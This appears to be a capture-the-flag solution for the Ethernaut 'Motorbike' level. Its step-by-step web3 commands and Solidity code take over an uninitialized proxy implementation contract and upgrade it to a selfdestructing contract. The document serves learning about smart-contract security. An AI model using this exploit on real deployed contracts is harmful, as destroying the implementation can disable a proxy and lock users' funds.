# Motorbike Solution

1. Get the impl address by checking the correct storage slot on the proxy:
```js
await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// returns '0x0000000000000000000000009ebb39474c8d4e18387eb610e885332d3d53491f'
```
2. Check if the impl contract is initialized.
```js
await web3.eth.getStorageAt(impl, 0)
// returns '0x0000000000000000000000000000000000000000000000000000000000000000'
// OR using sig "upgrader()" = 0xaf269745
await web3.eth.call({ from: player, to: impl, data: '0xaf269745' })
// returns '0x0000000000000000000000000000000000000000000000000000000000000000'
```
3. As it is not, we can initialize it and take ownership.
```js
// using sig "initialize()" = 0x8129fc1c
await web3.eth.sendTransaction({ from: player, to: impl, data: '0x8129fc1c' });
```
4. Deploy the following contract that self destructs:
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

contract Explosion {
    function implode() external {
        selfdestruct(payable(msg.sender));
    }
}
```
5. Prepare calldata to upgrade to the self destructing contract, delegate calling `implode()`
```solidity
bytes4 implode = 0x3d8aa9b8 // sig "implode()"
bytes4 upgrade = 0x4f1ef286 // sig "upgradeToAndCall(address,bytes)"
address explosion = 0x0f0ea2d6d12413e05e5a41fda0bd6d945dcc97f1
bytes memory subData = abi.encodeWithSelector(implode)
bytes memory rootData = abi.encodeWithSelector(upgrade, explosion, subData)
// returns 0x4f1ef2860000000000000000000000000f0ea2d6d12413e05e5a41fda0bd6d945dcc97f1000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000043d8aa9b80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```
6. Execute the upgrade transaction:
```js
await web3.eth.sendTransaction({ from: player, to: impl, data: '0x4f1ef2860000000000000000000000000f0ea2d6d12413e05e5a41fda0bd6d945dcc97f1000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000043d8aa9b80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' })
```

🎉 Tadaa! Job done.
